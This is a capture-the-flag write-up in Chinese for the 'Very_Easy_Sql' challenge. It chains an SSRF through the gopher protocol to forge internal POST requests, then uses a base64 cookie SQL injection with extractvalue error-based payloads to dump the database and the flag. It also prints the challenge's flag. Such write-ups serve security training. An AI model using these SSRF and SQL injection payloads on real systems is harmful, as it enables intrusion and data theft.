# Very_Easy_Sql

> SSRF+SQL注入

## Gopher

> gopher协议是一个在http协议诞生前用来访问Internet资源的协议,可以理解为http协议的前身或简化版,虽然很古老但现在很多库还支持gopher协议而且gopher协议功能很强大.它可以实现多个数据包整合发送,然后gopher服务器将多个数据包捆绑着发送到客户端,这就是它的菜单响应.协议的curl 命令就能操作mysql数据库或完成对redis的攻击等等.gopher协议使用tcp可靠连接.

## 思路分析

> 打开网站后首页后,在首页中直接burp拦截数据包去爆破账号密码没发现什么东西,sqlmap也没跑出来.在源码中找到了use.php,直接访问发现是一个输入url地址然后后端去请求的功能,经测试,不能输入file、http://等字符,dnslog方式可以收到请求但是不能执行命令,外带不出结果.说明此处还是存在ssrf漏洞的,想到在首页直接登陆会提示只能内部访问,说明请求的ip只能是内部的,尝试用gopher协议构造http请求报文去请求数据

> gopher://127.0.0.1:80/_POST%20%2findex.php%20HTTP%2f1.1%2
> 50d%250aHost%3A%20localhost%3A80%250d%250aCookie%3A%20PHPSESSID%3D1f546328759632456215236845122365%3B%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%2024%250d%250a%250d%250auname%3Dadmin%2526passwd%3D123456

> 发现返回的数据有响应,对传递的数据中账号密码爆破,发现账号密码为admin/admin.这是返回了一个base64编码的cookie,猜测cookie存在注入,尝试用this_is_your_cookie=YWRtaW4nICM=(admin' #)去发送数据

```
GET /use.php?url=gopher://127.0.0.1:80/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aCookie%3A%20this_is_your_cookie=YWRtaW4nICM=%3B%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%2024%250d%250a%250d%250auname%3Dadmin%2526passwd%3Dadmin HTTP/1.1
Host: 61.147.171.105:51577
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:51577/use.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Cookie: PHPSESSID=lb8pf8pkg1drfe7il17dkrh374
Connection: close
```

> 果然报错了,看来就是这个存在注入了,可以用报错注入来获取flag,也可以用延时注入编写py脚本去跑,得到flag.

## payload

```
GET /use.php?url=gopher://127.0.0.1:80/_POST%20%2findex.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%3A80%250d%250aCookie%3A%20Jykgb3IgMT0xICM=%3B%250d%250aConnection%3A%20close%250d%250aContent-Type%3A%20application%2fx-www-form-urlencoded%250d%250aContent-Length%3A%2024%250d%250a%250d%250auname%3Dadmin%2526passwd%3Dadmin HTTP/1.1
Host: 61.147.171.105:51577
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://61.147.171.105:51577/use.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8
Cookie: PHPSESSID=lb8pf8pkg1drfe7il17dkrh374
Connection: close
```

## payload

> admin') and extractvalue(1, concat(0x7e, (select @@version),0x7e)) #
> admin') and extractvalue(1, concat(0x7e, (select database()),0x7e)) #
> admin') and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='security'),0x7e)) #
> admin') and extractvalue(1, concat(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='flag'),0x7e)) #
> admin') and extractvalue(1, concat(0x7e, (SELECT flag from flag),0x7e)) #
> admin') and extractvalue(1, concat(0x7e, substr((SELECT flag from flag),30,32),0x7e)) #

## flag

> cyberpeace{469235bbb30fbe6ee35ec14ab2fa52dd}